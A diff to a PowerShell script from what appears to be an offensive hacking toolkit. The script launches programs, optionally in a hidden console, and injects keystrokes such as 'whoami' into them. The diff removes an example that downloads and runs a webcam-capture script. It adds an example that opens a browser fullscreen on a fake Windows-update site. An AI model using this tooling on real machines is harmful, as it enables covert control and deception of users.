@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: Reflection.Assembly {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.2
+   PS cmdlet Dev version: v1.0.3
 
 .DESCRIPTION
    Hackers often need to start background processes and let them run until
@@ -19,8 +19,8 @@
    to abort the execution of the process at a predefined time (-execdelay 'int')
 
 .NOTES
-   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$Env:TMP\WebCam.py"
-   .\sendkeys.ps1 -program "$Env:TMP\WebCam.py" -sendkey "^{c}" -execdelay "20"
+   Examples of keyboard presses, see here for key codes:
+   https://stackoverflow.com/questions/19824799/how-to-send-ctrl-or-alt-any-other-key
 
 .Parameter Program
    The program to start (default: $Env:WINDIR\System32\cmd.exe)
@@ -32,7 +32,7 @@
    The process arguments to execute (default: false)
 
 .Parameter SendKey
-   The sendkey value to execute (default: whoami+~)
+   The sendkey value to execute (default: whoami~)
 
 .Parameter ExecDelay
    The delay time (sec) to sendkeys (default: 4)
@@ -50,16 +50,20 @@
    Start 'cmd.exe' program and send '~' (ENTER) key to program
 
 .EXAMPLE
-   PS C:\> .\sendkeys.ps1 -Program "$Env:WINDIR\System32\cmd.exe" -SendKey "whoami+~"
-   Start 'cmd.exe' program and send 'whoami+~' (whoami+ENTER) key to program
+   PS C:\> .\sendkeys.ps1 -Program "$Env:WINDIR\System32\cmd.exe" -SendKey "whoami~"
+   Start 'cmd.exe' program and send 'whoami~' (whoami+ENTER) key to program
 
 .EXAMPLE
-   PS C:\> .\sendkeys.ps1 -Program "$Env:WINDIR\System32\cmd.exe" -SendKey "whoami+~" -style "hidden"
-   Start 'cmd.exe' program (hidden console) and send 'whoami+~' (WHOAMI+ENTER) key to program
+   PS C:\> .\sendkeys.ps1 -Program "$Env:WINDIR\System32\cmd.exe" -SendKey "whoami~" -style "hidden"
+   Start 'cmd.exe' program (hidden console) and send 'whoami~' (WHOAMI+ENTER) key to program
    
 .EXAMPLE
    PS C:\> .\sendkeys.ps1 -Program "$Env:WINDIR\System32\notepad.exe" -SendKey "hello world" -ExecDelay '1'
-   Start 'notepad.exe' program and send 'hello world' keys to program after one second of delay  
+   Start 'notepad.exe' program and send 'hello world' keys to program after one second of delay
+
+.EXAMPLE
+   PS C:\> .\sendkeys.ps1 -Program "$Env:LOCALAPPDATA\Programs\Opera GX\launcher.exe" -SendKey "https://fakeupdate.net/win11/~{F11}"
+   Start 'Opera.exe' new browser process and send 'https://fakeupdate.net/win11/' + '[ENTER + F11] ' keys to browser
 
 .OUTPUTS
    * Send Keys to running programs
@@ -74,7 +78,7 @@
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$Program="$Env:Windir\System32\cmd.exe",
    [string]$Arguments="false",
-   [string]$SendKey="whoami+~",
+   [string]$SendKey="whoami~",
    [string]$Style="normal",
    [int]$ExecDelay='4'
 )
@@ -195,6 +199,7 @@ $Null = [WinAp]::ShowWindow($NewProc.MainWindowHandle,3)
 
 #Sendkey
 $OrphanID = $NewProc.ID
+echo "$OrphanID" > $Env:TMP\NewProcPPID.log
 [System.Windows.Forms.SendKeys]::SendWait("$SendKey")
 If($?)
 {
